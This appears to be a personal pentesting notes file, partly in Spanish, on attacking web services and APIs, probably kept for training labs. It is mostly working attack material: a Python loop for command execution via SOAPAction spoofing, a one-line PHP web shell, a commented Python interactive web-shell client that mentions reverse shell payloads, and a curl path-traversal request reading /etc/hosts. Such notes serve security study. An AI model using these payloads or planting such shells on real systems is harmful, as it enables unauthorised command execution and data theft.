


### WSDL

Los WSDL son xmls que informan de los metodos disponibilizados, la forma de llamarlos y dónde residen


### SOAP

#### Soap Action Spoofing
SOAP messages towards a SOAP service should include both the operation and the related parameters. 
This operation resides in the first child element of the SOAP message's body. If HTTP is the transport of choice, it is allowed 
to use an additional HTTP header called SOAPAction, which contains the operation's name. The receiving web service can identify 
the operation within the SOAP body through this header without parsing any XML.

If a web service considers only the SOAPAction attribute when determining the operation to execute, then it may be vulnerable to 
SOAPAction spoofing.

ejemplo de soapaction spoofin:

        import requests

        while True:
            cmd = input("$ ")
            payload = f'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>{cmd}</cmd></LoginRequest></soap:Body></soap:Envelope>'
            print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)


########################### Information disclosure

Tenemos que invertir mucho tiempo en fuzzig cuando testeamos una api.
Si la api manifiesta una versión como "v2", siempre vale la pena probar versiones anteriores que pueden quedar como shadow


##########################arbitrary file inclusion.
si logramos subir una shell:
<?php if(isset($_REQUEST['cmd'])){ $cmd = ($_REQUEST['cmd']); system($cmd); die; }?>

pero no logramos explotarla desde el servidor, podemos atacar a la api que utiliza. La ubicación de la misma estará en las request del
navegador.

un código simple en python para aprovechar esta shell y transformarla en una más interactiva:
import argparse, time, requests, os # imports four modules argparse (used for system arguments), time (used for time), requests (used for HTTP/HTTPs Requests), os (used for operating system commands)
parser = argparse.ArgumentParser(description="Interactive Web Shell for PoCs") # generates a variable called parser and uses argparse to create a description
parser.add_argument("-t", "--target", help="Specify the target host E.g. http://<TARGET IP>:3001/uploads/backdoor.php", required=True) # specifies flags such as -t for a target with a help and required option being true
parser.add_argument("-p", "--payload", help="Specify the reverse shell payload E.g. a python3 reverse shell. IP and Port required in the payload") # similar to above
parser.add_argument("-o", "--option", help="Interactive Web Shell with loop usage: python3 web_shell.py -t http://<TARGET IP>:3001/uploads/backdoor.php -o yes") # similar to above
args = parser.parse_args() # defines args as a variable holding the values of the above arguments so we can do args.option for example.
if args.target == None and args.payload == None: # checks if args.target (the url of the target) and the payload is blank if so it'll show the help menu
    parser.print_help() # shows help menu
elif args.target and args.payload: # elif (if they both have values do some action)
    print(requests.get(args.target+"/?cmd="+args.payload).text) ## sends the request with a GET method with the targets URL appends the /?cmd= param and the payload and then prints out the value using .text because we're already sending it within the print() function
if args.target and args.option == "yes": # if the target option is set and args.option is set to yes (for a full interactive shell)
    os.system("clear") # clear the screen (linux)
    while True: # starts a while loop (never ending loop)
        try: # try statement
            cmd = input("$ ") # defines a cmd variable for an input() function which our user will enter
            print(requests.get(args.target+"/?cmd="+cmd).text) # same as above except with our input() function value
            time.sleep(0.3) # waits 0.3 seconds during each request
        except requests.exceptions.InvalidSchema: # error handling
            print("Invalid URL Schema: http:// or https://")
        except requests.exceptions.ConnectionError: # error handling
            print("URL is invalid")


python shell.py -t url/path-to-file/file.php -o yes

############################ FIle inclusion:
cuando vemos que un endpoint nos permite buscar o presentar archivos (ej downloads) siempre es un buen momento para probar una LFI:
curl "http://<TARGET IP>:3000/api/download/..%2f..%2f..%2f..%2fetc%2fhosts"
siempre se recomienda encodear el payload.

####################### XSS

Si vemos que los valores introducidos en la url del endpoint se reflejan en la página siempre es un buen momento para probar XSS.
P.D.: Siempre encodear una vez.

